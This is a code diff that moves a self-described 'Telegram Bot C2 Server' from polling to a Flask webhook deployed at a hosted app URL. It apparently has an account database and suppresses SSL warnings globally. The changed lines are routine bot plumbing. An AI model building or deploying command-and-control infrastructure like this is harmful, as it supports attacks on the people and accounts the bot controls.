@@ -23,6 +23,7 @@ from queue import Queue
 import hashlib
 import os
 from database import AccountDatabase
+from flask import Flask, request
 
 # Suppress SSL warnings globally
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -1051,6 +1052,11 @@ token_cache_time = None
 bot = telebot.TeleBot(BOT_TOKEN)
 user_state = {}
 
+# Flask app for webhook
+app = Flask(__name__)
+WEBHOOK_URL_BASE = None  # Will be set when app starts
+WEBHOOK_URL_PATH = f"/{BOT_TOKEN}/"
+
 def get_batch_name():
     return datetime.now().strftime("batch_%Y%m%d_%H%M%S")
 
@@ -2040,42 +2046,57 @@ def refresh_menu(chat_id):
 
 
 if __name__ == "__main__":
-    print("[*] Starting Telegram Bot C2 Server...")
+    print("[*] Starting Telegram Bot C2 Server (WEBHOOK MODE)...")
     
     # Initialize systems
     print(f"[✓] Database initialized successfully")
     print(f"[✓] Verified users system ready")
     
-    # Connect to Telegram with retry logic
-    max_consecutive_errors = 0
-    while True:
+    # Webhook endpoint - receives updates from Telegram
+    @app.route(WEBHOOK_URL_PATH, methods=['POST'])
+    def webhook():
+        """Receive updates from Telegram"""
+        if request.headers.get('content-type') == 'application/json':
+            json_string = request.get_data().decode('utf-8')
+            update = telebot.types.Update.de_json(json_string)
+            bot.process_new_updates([update])
+        return "OK", 200
+    
+    # Health check endpoint
+    @app.route('/health', methods=['GET'])
+    def health():
+        return {"status": "healthy"}, 200
+    
+    # Set webhook during startup
+    def register_webhook():
+        """Register webhook with Telegram"""
+        webhook_url = f"{WEBHOOK_URL_BASE}{WEBHOOK_URL_PATH}"
         try:
-            bot.infinity_polling(timeout=10, long_polling_timeout=10, skip_pending=True)
-        except KeyboardInterrupt:
-            print("\n[*] Bot stopped by user")
-            break
+            print(f"[*] Setting webhook URL: {webhook_url}")
+            bot.set_webhook(url=webhook_url, max_connections=40, allowed_updates=[])
+            print(f"[✓] Webhook registered successfully!")
         except Exception as e:
-            error_str = str(e)
-            max_consecutive_errors += 1
-            
-            # Check if it's a 409 conflict error (multiple instances)
-            if "409" in error_str or "Conflict" in error_str:
-                print(f"[ERROR] CRITICAL: Multiple bot instances detected!")
-                print(f"[ERROR] Only one instance can poll at a time. Stopping this instance...")
-                print(f"[ERROR] Details: {error_str[:200]}")
-                break
-            
-            print(f"[ERROR] Bot polling error ({max_consecutive_errors}/5): {error_str[:100]}")
-            
-            # If too many consecutive errors, stop
-            if max_consecutive_errors >= 5:
-                print(f"[ERROR] Too many consecutive errors. Stopping bot.")
-                break
-            
-            # Exponential backoff: 5s, 10s, 15s, 20s, 25s
-            backoff_time = min(5 * max_consecutive_errors, 30)
-            print(f"[*] Reconnecting in {backoff_time} seconds...")
-            time.sleep(backoff_time)
+            print(f"[ERROR] Failed to register webhook: {e}")
+    
+    # Get app URL from environment or use default
+    import os
+    PORT = int(os.getenv('PORT', 8080))
+    WEBHOOK_URL_BASE = os.getenv('WEBHOOK_URL', f'https://hammerhead-app-h8gb9g9s.ondigitalocean.app')
+    
+    print(f"[*] Webhook URL Base: {WEBHOOK_URL_BASE}")
+    print(f"[*] Running on port {PORT}")
+    
+    # Register webhook before starting Flask
+    register_webhook()
+    
+    # Start Flask server
+    try:
+        app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
+    except KeyboardInterrupt:
+        print("\n[*] Bot stopped by user")
+    except Exception as e:
+        print(f"[ERROR] Flask error: {e}")
+        import traceback
+        traceback.print_exc()
     
     print("[*] Bot process ended")
-            # Continue loop to retry
